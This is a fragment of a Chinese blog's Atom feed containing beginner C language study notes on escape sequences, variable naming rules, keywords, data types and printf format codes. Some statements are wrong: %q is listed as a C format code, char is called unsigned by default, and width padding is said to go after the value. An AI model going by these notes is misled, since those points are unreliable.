style="text-align:center">011</td></tr><tr><td style="text-align:center">\\</td><td style="text-align:center">代表反斜线字符</td><td style="text-align:center">092</td></tr><tr><td style="text-align:center">\‘</td><td style="text-align:center">代表一个单引号</td><td style="text-align:center">039</td></tr><tr><td style="text-align:center">\“</td><td style="text-align:center">代表一个双引号</td><td style="text-align:center">034</td></tr><tr><td style="text-align:center">\?</td><td style="text-align:center">代表一个问号</td><td style="text-align:center">063</td></tr><tr><td style="text-align:center">\0</td><td style="text-align:center">代表一个空字符</td><td style="text-align:center">000</td></tr><tr><td style="text-align:center">\ooo</td><td style="text-align:center">1到3位八进制数所代表的任意字符</td><td style="text-align:center">三位八进制</td></tr><tr><td style="text-align:center">\xff</td><td style="text-align:center">1到2位十六进制所代表的任意字符</td><td style="text-align:center">两位十六进制</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      正好，学了两章，就先发两章吧，感觉emmmmm，C语言还是挺接近系统底层控制的，这样的语言学深了也不简单啊..................唉！
    
    </summary>
    
      <category term="C语言笔记" scheme="http://0xpoker.cuit.site/categories/C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="C语言" scheme="http://0xpoker.cuit.site/tags/C%E8%AF%AD%E8%A8%80/"/>
    
      <category term="笔记" scheme="http://0xpoker.cuit.site/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>C语言笔记——变量</title>
    <link href="http://0xpoker.cuit.site/20171124/C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%8F%98%E9%87%8F/"/>
    <id>http://0xpoker.cuit.site/20171124/C语言笔记——变量/</id>
    <published>2017-11-24T17:52:10.000Z</published>
    <updated>2017-12-01T18:23:35.708Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言笔记——变量"><a href="#C语言笔记——变量" class="headerlink" title="C语言笔记——变量"></a>C语言笔记——变量</h1><p><strong>好不容易开始学C语言了，那就把笔记忘这上面搬过来吧。</strong></p><h2 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h2><ul><li>C语言变量名只能是英文字母（A-Z,a-z）和数字（0-9）或者下划线（_）组成。</li><li>必须是字母或者下划线开头。</li><li>变量名区分大小写（如 F ≠ f ）</li><li>不能使用关键字对变量进行命名。</li><li>C语言的变量必须先声明再使用，包括实参和形参</li></ul><h2 id="传统C语言关键词"><a href="#传统C语言关键词" class="headerlink" title="传统C语言关键词"></a>传统C语言关键词</h2><pre><code>■ auto    ■ break   ■ case   ■ char   ■ const   ■ continue■ default   ■ do   ■ double   ■ else   ■ enum   ■ extern■ float   ■ for   ■ goto   ■ if   ■ int   ■ long   ■ register■ return   ■ short  ■ signed  ■ sizeof   ■ static ■ struct■ switch   ■ typedef   ■ union   ■ unsigned   ■ void■ volatile   ■ while   ■ inline   ■ restrict   ■ _Bool■ _Complex   ■ _Imaginary   ■ _Alignas   ■ _Alignof  ■ _Atomic   ■ _Static_assert   ■ _Noreturn■ _Thread_local   ■ _Generic</code></pre><a id="more"></a><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><table><thead><tr><th>类型</th><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>整数型</td><td>int</td><td>整型，通常反映了所用机器中整数的最自然长度</td></tr><tr><td>字符型</td><td>char</td><td>字符型，占用一个字节默认无符号</td></tr><tr><td>单精度浮点型</td><td>float</td><td>（无）</td></tr><tr><td>双精度浮点型</td><td>double</td><td>（无）</td></tr></tbody></table><h2 id="格式化字符串与变量对应转换规则"><a href="#格式化字符串与变量对应转换规则" class="headerlink" title="格式化字符串与变量对应转换规则"></a>格式化字符串与变量对应转换规则</h2><table><thead><tr><th style="text-align:center">格式码</th><th style="text-align:center">参数</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:center">%c</td><td style="text-align:center">字符</td><td style="text-align:left">参数被裁剪为8位字节码并作为字符进行打印</td></tr><tr><td style="text-align:center">%i,%d</td><td style="text-align:center">数字值</td><td style="text-align:left">参数作为一个十进制整数打印。如果给出了精度而且值的位数小于精度位数，前面就用0填充</td></tr><tr><td style="text-align:center">%u,%o,%x,%X</td><td style="text-align:center">数字值</td><td style="text-align:left">参数作为一个无符号数字值打印，u使用十进制，o使用八进制，x或X使用十六进制，两者的区别是x约定使用abcdef，而X约定使用ABCDEF</td></tr><tr><td style="text-align:center">%e,%E</td><td style="text-align:center">数字值</td><td style="text-align:left">参数根据指数形式打印。例如，6.023000e23是使用代码e，6.023000E23是使用代码E。小数点后面的位数由精度字段决定，缺省值是6</td></tr><tr><td style="text-align:center">%f</td><td style="text-align:center">数字值</td><td style="text-align:left">参数按照的常规浮点格式打印。精度字段决定小数点后面的位数，缺省值是6</td></tr><tr><td style="text-align:center">%g,%G</td><td style="text-align:center">数字值</td><td style="text-align:left">参数以%f或%e（如G则%E）的格式打印，取决于它的值。如果指数大于等于-4但小于精度字段就使用%f格式，否则使用指数格式</td></tr><tr><td style="text-align:center">%s</td><td style="text-align:center">字符串</td><td style="text-align:left">打印一个字符串</td></tr><tr><td style="text-align:center">%q</td><td style="text-align:center">（无）</td><td style="text-align:left">打印一个字符串，并将字符串置于一对引号中，如果字符串中包含引号换行等自动添加转义符。如果要读取一个字符串传为代码。为避免用户恶意注入引号等特殊字符，可以使用%q进行格式化</td></tr><tr><td style="text-align:center">%%</td><td style="text-align:center">（无）</td><td style="text-align:left">取消%转义打印一个%字符,即用%%表示本来的%</td></tr></tbody></table><blockquote><p>注： %11.9f中的9表示精确到小数点后9位，以此类推；11表示输出字符串长度为11不够在后面加空格</p></blockquote>]]></content>
    
    <summary type="html">
    
      偷得浮生半日闲，学习了下C语言，其实吧，我一直挺想好好学习下C语言的，可是无奈时间总是被占用，真的是.........................留下了没技术的泪水.jpg
    
    </summary>
    
      <category term="C语言笔记" scheme="http://0xpoker.cuit.site/categories/C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="C语言" scheme="http://0xpoker.cuit.site/tags/C%E8%AF%AD%E8%A8%80/"/>
    
      <category term="笔记" scheme="http://0xpoker.cuit.site/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
